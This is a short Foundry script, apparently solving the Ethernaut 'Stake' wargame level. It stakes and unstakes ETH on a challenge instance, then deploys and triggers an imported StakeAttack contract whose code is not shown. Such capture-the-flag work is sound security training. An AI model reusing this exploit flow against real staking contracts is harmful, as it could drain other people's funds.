// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/StakeAttack.sol"; // 1) add file

contract SolveStake is Script { // 2) change contractName

    function run() external {

        address target = 0xAc1A88577210B9144eC261842451e0D1D428e035; // 3) add ethernaut instance address
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        IStake(target).StakeETH{value: 0.002 ether}();

        IStake(target).Unstake(0.002 ether);

        StakeAttack attacker = new StakeAttack{value: 0.004 ether}(target);
        attacker.attack();

        vm.stopBroadcast();

    }
}